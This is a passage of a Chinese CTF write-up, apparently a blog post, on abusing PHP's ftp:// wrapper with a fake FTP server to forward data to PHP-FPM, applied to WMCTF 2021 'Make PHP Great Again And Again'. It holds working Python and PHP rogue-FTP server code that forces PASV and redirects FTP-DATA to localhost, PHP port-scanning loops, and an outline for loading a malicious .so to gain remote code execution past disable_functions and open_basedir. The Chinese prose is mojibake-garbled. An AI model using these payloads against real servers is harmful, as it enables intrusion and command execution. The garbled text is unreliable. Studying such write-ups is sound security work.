&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php ftp_write_2.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;newwwwew&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png" alt="image-20211112225832777">&lt;/p>
&lt;h4 id="ä»¤phpä½¿ç”¨ftpå¹¶è½¬å‘ftp-data">ä»¤phpä½¿ç”¨ftp://å¹¶è½¬å‘FTP-DATA&lt;/h4>
&lt;p>å°†ä¸Šé¢çš„æ“ä½œç”¨wiresharkæŠ“ä¸ªåŒ…çœ‹çœ‹æµé‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png" alt="image-20211112230401822">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯EPSV modeè€Œä¸æ˜¯PASV modeï¼Œä¸ä¼šæœ‰æ‹¬å·å†…çš„ip+portæè¿°ï¼ŒFTP-DATAåªä¼šè¢«æ‰“å‘æ§åˆ¶è¿æ¥çš„æœåŠ¡ç«¯çš„ç«¯å£ï¼Œä¸èƒ½åšåˆ°FTP-DATAçš„ä»»æ„è½¬å‘&lt;/p>
&lt;p>ä¸è¿‡ä¹Ÿä¸æ˜¯æ¯«æ— åŠæ³•ï¼Œå¦‚æœç”¨EPSVå‘½ä»¤è¿”å›çš„ç»“æœä¸æ˜¯229ï¼Œé‚£ä¹ˆphpçš„ftp://å°±ä¼šä½¿ç”¨PASVå‘½ä»¤&lt;/p>
&lt;p>å°†ä¸Šé¢çš„ftp-serverä¿®æ”¹ä¸€ä¸‹ï¼Œå°†229å“åº”è®¾ä¸ºäº†000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;550 Could not get file size.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># responese with 000 , not 229&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;000 use PASV then&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># then php will send PASV command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># response to PASV command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png" alt="image-20211112234038671">&lt;/p>
&lt;p>æˆåŠŸè½¬å‘&lt;/p>
&lt;h4 id="ä½¿ç”¨ftpå°†payloadæ‰“å‘fpm">ä½¿ç”¨ftp://å°†payloadæ‰“å‘fpm&lt;/h4>
&lt;p>ç»“åˆä¸Šé¢å‡ ä¸ªå®ä¾‹åº”è¯¥å°±å¾ˆæ¸…æ™°äº†ï¼Œæ€è·¯å°±æ˜¯ï¼š&lt;/p>
&lt;ul>
&lt;li>ç¼–å†™åŒ…å«æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¶æ„.so&lt;/li>
&lt;li>æ‰“å‘fpmçš„ä¸€æ³¢æµé‡ï¼Œç”¨äºè§£å¼€open_basedir, allow_url_includeç­‰çš„é™åˆ¶ï¼Œå½¢å¼æ˜¯file_put_contents(&amp;lsquo;ftp://xxx&amp;rsquo;,$payload)&lt;/li>
&lt;li>ç”¨file_put_contents(&amp;rsquo;/tmp/wuhu.so&amp;rsquo;,$_POST[&amp;lsquo;data&amp;rsquo;])çš„å½¢å¼å°†.soä¼ å…¥&lt;/li>
&lt;li>å¦‚æœé¡ºåˆ©çš„è¯open_basedirè§£å¼€é™åˆ¶ï¼Œ.soè¢«åŒ…å«ï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œ.soä¸­çš„ä»£ç åšåˆ°rceäº†&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œçš„å®Œç¾æ —å­å½“ç„¶æ˜¯èµµæ€»çš„ä¸‰å¥è¯ï¼ˆæŒ‡è·¯èµµæ€»åšå®¢-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
&lt;h4 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h4>
&lt;p>æ€è·¯å…ˆæ”¾åœ¨å‰é¢ï¼šæ‰¾åˆ°fpmç«¯å£-&amp;gt;æ­å»ºæ¶æ„ftp_server å°†.soæ–‡ä»¶è½¬å‘è‡³fpmç«¯å£-&amp;gt;åˆ©ç”¨.soæ–‡ä»¶æ‰§è¡Œå‘½ä»¤-&amp;gt;æ‹¿flag&lt;/p>
&lt;p>é¢˜ç›®ä»£ç åªæœ‰ä¸‰å¥è¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;glzjin&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æ¥çœ‹phpinfo();ä¼š500ï¼Œç”¨&lt;code>get_cfg_var&lt;/code>è·å–é…ç½®é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(657) &amp;#34;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive&amp;#34;
&lt;/code>&lt;/pre>&lt;p>åªèƒ½è¯´è¯¥ç¦çš„éƒ½ç¦äº†ï¼›å†åº·åº·allow_url_fopenå’Œinclude&lt;/p>
&lt;pre tabindex="0">&lt;code>string(1) &amp;#34;1&amp;#34;
string(0) &amp;#34;&amp;#34;
&lt;/code>&lt;/pre>&lt;p>å†åº·åº·open_basedir&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(14) &amp;#34;/var/www/html/&amp;#34;
&lt;/code>&lt;/pre>&lt;p>emmmmmmmmm è¿™ä¸ªä¹‹åä¹Ÿéœ€è¦ç»•è¿‡&lt;/p>
&lt;p>ç”¨tcp://ä¼ªåè®®æ‰«ä¸€ä¸‹æœ¬æœºå¼€æ”¾çš„ç«¯å£&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ee2&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;Address already in use&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…&lt;code>file_get_contents&lt;/code>å’Œ&lt;code>error_get_last&lt;/code>è·å–åˆ°è¯·æ±‚ä¸­å‘å‡ºçš„é”™è¯¯è¿›è¡Œå¾ªç¯åˆ¤æ–­ä¹Ÿå¯ä»¥è¿›è¡Œç«¯å£æ‰«æ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error_get_last&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#d88200">&amp;#39;message&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection refused&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>int(11451) int(37114) int(48748)
&lt;/code>&lt;/pre>&lt;p>æ‰¾åˆ°äº†fpmç«¯å£11451&lt;/p>
&lt;p>ä¹‹åå°±ç»­ä¸Šäº†æˆ‘ä»¬å‰é¢çš„æ€è·¯ï¼Œå…ˆåœ¨æœ¬åœ°ï¼ˆä¹Ÿå°±æ˜¯é¶æœºçš„æœ¬åœ°ï¼‰èµ·ä¸€ä¸ªæ¶æ„çš„ftp_serveræœåŠ¡ç”¨æ¥è½¬å‘FTP-DATAï¼ˆå³.soæ–‡ä»¶ï¼‰è‡³fpmç«¯å£ï¼ˆ11451ï¼‰ï¼›è¿™é‡Œçš„expæ˜¯phpç‰ˆçš„ï¼ŒåŸç†è·Ÿä¸Šé¢çš„pyç‰ˆæ˜¯ä¸€æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$socket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:46819&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errno&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$errstr&lt;/span>&lt;span style="color:#d88200"> (&lt;/span>&lt;span style="color:#d88200">$errno&lt;/span>&lt;span style="color:#d88200">)&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_accept&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;210 Fake FTP&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// USER
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;230 Login successful&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
